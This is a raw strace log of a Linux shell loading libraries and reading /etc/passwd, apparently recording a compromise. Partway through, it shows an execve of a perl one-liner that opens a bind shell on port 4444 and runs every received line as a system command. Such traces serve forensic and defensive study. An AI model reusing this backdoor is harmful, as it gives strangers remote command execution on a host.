12708 07:43:45.381684 close(1)          = 0
12708 07:43:45.381697 open("/etc/nsswitch.conf", O_RDONLY) = 1
12708 07:43:45.381711 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12708 07:43:45.381727 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f25000
12708 07:43:45.381738 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12708 07:43:45.381785 read(1, "", 4096) = 0
12708 07:43:45.381795 close(1)          = 0
12708 07:43:45.381804 munmap(0xb7f25000, 4096) = 0
12708 07:43:45.381820 open("/etc/ld.so.cache", O_RDONLY) = 1
12708 07:43:45.381832 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12708 07:43:45.381847 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f1e000
12708 07:43:45.381857 close(1)          = 0
12708 07:43:45.381867 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12708 07:43:45.381881 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
12708 07:43:45.381883 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
12708 07:43:45.381883 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
12708 07:43:45.381883 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d90000
12708 07:43:45.381886 mmap2(0xb7d97000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d97000
12708 07:43:45.381903 close(1)          = 0
12708 07:43:45.381915 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12708 07:43:45.381928 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
12708 07:43:45.381941 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
12708 07:43:45.382027 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
12708 07:43:45.382044 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d78000
12708 07:43:45.382055 mmap2(0xb7d8c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d8c000
12708 07:43:45.382070 mmap2(0xb7d8e000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d8e000
12708 07:43:45.382084 close(1)          = 0
12708 07:43:45.382109 munmap(0xb7f1e000, 29913) = 0
12708 07:43:45.382134 open("/etc/ld.so.cache", O_RDONLY) = 1
12708 07:43:45.382187 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12708 07:43:45.382217 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f1e000
12708 07:43:45.382227 close(1)          = 0
12708 07:43:45.382238 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12708 07:43:45.382252 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
12708 07:43:45.382267 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12708 07:43:45.382371 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
12708 07:43:45.382388 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d6e000
12708 07:43:45.382399 mmap2(0xb7d76000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d76000
12708 07:43:45.382414 close(1)          = 0
12708 07:43:45.382426 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12708 07:43:45.382439 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
12708 07:43:45.382454 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12708 07:43:45.382540 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12708 07:43:45.382557 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d63000
12708 07:43:45.382568 mmap2(0xb7d6c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d6c000
12708 07:43:45.382583 close(1)          = 0
12708 07:43:45.382603 munmap(0xb7f1e000, 29913) = 0
12708 07:43:45.382618 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
12708 07:43:45.382661 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12708 07:43:45.382673 _llseek(1, 0, [0], SEEK_CUR) = 0
12708 07:43:45.382698 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
12708 07:43:45.382714 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f25000
12708 07:43:45.382725 _llseek(1, 1624, [1624], SEEK_SET) = 0
12708 07:43:45.382740 munmap(0xb7f25000, 1624) = 0
12708 07:43:45.382749 close(1)          = 0
12708 07:43:45.382777 getpgrp()         = 3831
12708 07:43:45.382787 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
12708 07:43:45.382802 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
12708 07:43:45.382817 brk(0x8101000)    = 0x8101000
12708 07:43:45.382847 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12708 07:43:45.382861 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12708 07:43:45.382875 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12708 07:43:45.382911 brk(0x8102000)    = 0x8102000
12708 07:43:45.382936 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12708 07:43:45.382954 stat64("/sbin/AB", 0xbf838688) = -1 ENOENT (No such file or directory)
12708 07:43:45.382966 stat64("/bin/AB", 0xbf838688) = -1 ENOENT (No such file or directory)
12708 07:43:45.382977 stat64("/usr/sbin/AB", 0xbf838688) = -1 ENOENT (No such file or directory)
12708 07:43:45.382989 stat64("/usr/bin/AB", 0xbf838688) = -1 ENOENT (No such file or directory)
12708 07:43:45.383002 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12708 07:43:45.383016 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d996f8) = 12709
12709 07:43:45.383059 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12709 07:43:45.383079 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12709 07:43:45.383091 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12709 07:43:45.383103 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12709 07:43:45.383118 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12709 07:43:45.383198 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12709 07:43:45.383228 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12709 07:43:45.383298 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
12709 07:43:45.383312 --- SIGPIPE (Broken pipe) @ 0 (0) ---
12709 07:43:45.383377 exit_group(127)   = ?
12708 07:43:45.399026 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12708 07:43:45.399026 --- SIGCHLD (Child exited) @ 0 (0) ---
12708 07:43:45.399026 waitpid(-1,  <unfinished ...>
4519  07:43:45.399035 waitpid(12708,  <unfinished ...>
12708 07:43:45.399047 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 12709
12708 07:43:45.399056 waitpid(-1, 0xbf838308, WNOHANG) = -1 ECHILD (No child processes)
12708 07:43:45.399066 sigreturn()       = ? (mask now [])
12708 07:43:45.399088 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12708 07:43:45.399102 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12708 07:43:45.399113 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12708 07:43:45.399125 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12708 07:43:45.399142 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12708 07:43:45.399153 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12708 07:43:45.399185 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12708 07:43:45.399203 stat64("/sbin/perl", 0xbf8386b8) = -1 ENOENT (No such file or directory)
12708 07:43:45.399215 stat64("/bin/perl", 0xbf8386b8) = -1 ENOENT (No such file or directory)
12708 07:43:45.399226 stat64("/usr/sbin/perl", 0xbf8386b8) = -1 ENOENT (No such file or directory)
12708 07:43:45.399238 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12708 07:43:45.399255 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12708 07:43:45.399279 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12708 07:43:45.399293 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d996f8) = 12710
12710 07:43:45.399334 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12710 07:43:45.399350 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12710 07:43:45.399362 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12710 07:43:45.399374 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12710 07:43:45.399388 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12710 07:43:45.399433 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12710 07:43:45.399447 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12710 07:43:45.399493 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
12710 07:43:45.399574 brk(0)            = 0x8153000
12710 07:43:45.399593 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12710 07:43:45.399608 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
12710 07:43:45.399623 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12710 07:43:45.399640 open("/etc/ld.so.cache", O_RDONLY) = 1
12710 07:43:45.399652 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12710 07:43:45.399668 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fca000
12710 07:43:45.399678 close(1)          = 0
12710 07:43:45.399688 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12710 07:43:45.399703 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12710 07:43:45.399717 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12710 07:43:45.399810 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12710 07:43:45.399827 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fc6000
12710 07:43:45.399839 mmap2(0xb7fc8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fc8000
12710 07:43:45.399854 close(1)          = 0
12710 07:43:45.399865 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12710 07:43:45.399879 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
12710 07:43:45.399892 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
12710 07:43:45.400020 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
12710 07:43:45.400037 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa1000
12710 07:43:45.400048 mmap2(0xb7fc4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7fc4000
12710 07:43:45.400063 close(1)          = 0
12710 07:43:45.400075 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12710 07:43:45.400088 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
12710 07:43:45.400102 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
12710 07:43:45.400190 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
12710 07:43:45.400207 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa0000
12710 07:43:45.400220 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f88000
12710 07:43:45.400230 mmap2(0xb7f9c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f9c000
12710 07:43:45.400244 mmap2(0xb7f9e000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f9e000
12710 07:43:45.400258 close(1)          = 0
12710 07:43:45.400269 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12710 07:43:45.400282 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12710 07:43:45.400296 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 